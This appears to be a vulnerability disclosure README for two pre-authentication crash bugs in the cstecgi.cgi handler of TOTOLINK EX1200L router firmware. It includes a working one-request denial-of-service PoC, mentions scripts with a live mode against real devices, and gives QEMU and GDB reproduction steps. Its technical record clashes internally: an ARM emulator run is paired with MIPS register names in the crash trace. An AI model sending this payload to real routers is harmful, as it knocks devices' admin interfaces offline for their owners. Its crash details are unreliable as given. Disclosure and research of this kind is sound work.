# TOTOLINK EX1200L — pre-auth NULL dereference in cstecgi.cgi (CVE-2026-75012 / CVE-2026-75013)

## Affected Software
- **Product: TOTOLINK EX1200L**
- **Version(s): firmware built on 2022-06-28 (cstecgi.cgi as shipped)**
- **Vendor: TOTOLINK (Shenzhen C-Data)**

## Vulnerability Type
NULL Pointer Dereference in JSON CGI handler, pre-authentication (CWE-476)

## Description
The `cstecgi.cgi` CGI backend dispatches POST requests by the `topicurl` field of the JSON body. Two handlers dereference mandatory fields without checking their presence:

- **CVE-2026-75012 — `setPasswordCfg`**: a body of `{"topicurl":"setPasswordCfg"}` (password field absent) reaches `strcoll()` with a NULL first argument and crashes with SIGSEGV.
- **CVE-2026-75013 — `setWizardCfg`**: same pattern for the wizard handler; the process dies on the missing field.

Both endpoints are reachable **before authentication** (the CGI is invoked by the pre-auth setup wizard flow), so a single unauthenticated HTTP POST kills the web service (pre-auth DoS).

## Proof of Concept (PoC)

```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Content-Type: application/json

{"topicurl":"setPasswordCfg"}
```

Scripts in this directory (both support `--live <ip>` against a real device and direct QEMU execution):
- `poc_ex1200l_setPasswordCfg.py` — CVE-2026-75012
- `poc_ex1200l_setWizardCfg.py` — CVE-2026-75013

## Steps to Reproduce

QEMU user-mode (deterministic, used for the archived evidence):

```bash
qemu-arm-static -L <extracted-firmware-root> <root>/webroot/cgi-bin/cstecgi.cgi \
    < poc_body.json    # -> qemu: uncaught target signal 11 (SIGSEGV)
```

GDB (see `evidence/ex1200l_cve_gdb.png` / `.txt`, captured 2026-09-14):

```
Program received signal SIGSEGV
0x2b3aa414 in strcoll ()      <- a1 = 0x0 (NULL), ra = 0x4259ec
```

Direct execution of both PoC bodies exits with status 139 (SIGSEGV) — see
`evidence/ex1200l_cve_direct.png`, `evidence/ex1200l_cve_75012_75013.png`.

## Evidence
- `evidence/ex1200l_cve_gdb.png|.txt` — GDB session for CVE-2026-75012 (SIGSEGV @ `strcoll`, `a1=0x0`)
- `evidence/ex1200l_cve_direct.png|.txt` — both PoC bodies, direct run, exit=139
- `evidence/ex1200l_cves.sh` — reproduction script used for the captures

## Impact
* **Availability**: unauthenticated remote DoS of the device web UI (service crash; watchdog restart loop possible)
* **Confidentiality/Integrity**: none directly (NULL deref), but crash reliability is 100%

## References
- CVE-2026-75012, CVE-2026-75013 (assigned via VulDB, 2026-09)
